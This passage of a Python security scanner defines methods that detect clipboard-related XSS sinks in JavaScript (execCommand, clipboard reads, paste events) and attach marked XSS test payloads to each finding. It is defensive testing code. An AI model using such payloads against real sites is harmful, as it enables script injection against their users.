                            sink=ClipboardSink.CLIPBOARD_READ,
                            injection_point=f"line_{line_num}",
                            context="Clipboard data reflection to DOM",
                            payload=marked,
                            severity="critical"
                        ))

        return vulnerabilities

    def check_exec_command_xss(self, js_content: str, marker: str = "xoxss") -> List[ClipboardXSSVulnerability]:
        """
        Check for XSS via execCommand clipboard operations.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            # Check for execCommand with clipboard operations
            if re.search(r'execCommand\s*\(\s*["\']paste|execCommand\s*\(\s*["\']copy', line, re.IGNORECASE):
                # Check if user input is used
                if re.search(r'event\.|request\.|user|input', line, re.IGNORECASE):
                    for payload in self.CLIPBOARD_XSS_PAYLOADS:
                        marked = payload.replace("alert(1)", f"alert('{marker}')")
                        vulnerabilities.append(ClipboardXSSVulnerability(
                            sink=ClipboardSink.EXEC_COMMAND,
                            injection_point=f"line_{line_num}",
                            context="execCommand clipboard operation with user input",
                            payload=marked,
                            severity="medium"
                        ))

        return vulnerabilities

    def scan_for_clipboard_xss(
        self,
        html_content: str,
        js_content: str = "",
        marker: str = "xoxss"
    ) -> List[ClipboardXSSVulnerability]:
        """
        Scan for clipboard XSS vulnerabilities.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        self._vulnerabilities = []
        sinks = self.detect_clipboard_sinks(js_content, html_content)

        if not sinks:
            return self._vulnerabilities

        # Check dangerous integration
        self._vulnerabilities.extend(self.check_dangerous_integration(js_content, marker))

        # Check paste event XSS
        if ClipboardSink.PASTE_EVENT in sinks:
            self._vulnerabilities.extend(self.check_paste_event_xss(js_content, marker))

        # Check clipboard reflection
        if ClipboardSink.CLIPBOARD_READ in sinks:
            self._vulnerabilities.extend(self.check_clipboard_reflection(js_content, marker))

        # Check execCommand XSS
        if ClipboardSink.EXEC_COMMAND in sinks:
            self._vulnerabilities.extend(self.check_exec_command_xss(js_content, marker))

        return self._vulnerabilities

    def assess_clipboard_risk(self, vulnerabilities: List[ClipboardXSSVulnerability]) -> str:
        """Assess overall clipboard XSS risk."""
        if not vulnerabilities:
            return "none"

        critical_severity = [v for v in vulnerabilities if v.severity == "critical"]
        if critical_severity:
            return "critical"

        high_severity = [v for v in vulnerabilities if v.severity == "high"]
        if high_severity:
            return "high"

        return "medium"

    def get_clipboard_summary(self) -> Dict[str, int]:
        """Get summary of clipboard findings."""
        summary = {
            "total_vulnerabilities": len(self._vulnerabilities),
            "by_sink": {
                "clipboard_write": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.CLIPBOARD_WRITE),
                "clipboard_read": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.CLIPBOARD_READ),
                "paste_event": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.PASTE_EVENT),
                "copy_event": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.COPY_EVENT),
                "cut_event": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.CUT_EVENT),
                "exec_command": sum(1 for v in self._vulnerabilities if v.sink == ClipboardSink.EXEC_COMMAND),
            },
        }
        return summary


__all__ = [
    "ClipboardSink",
    "ClipboardXSSDetector",
    "ClipboardXSSVulnerability",
]
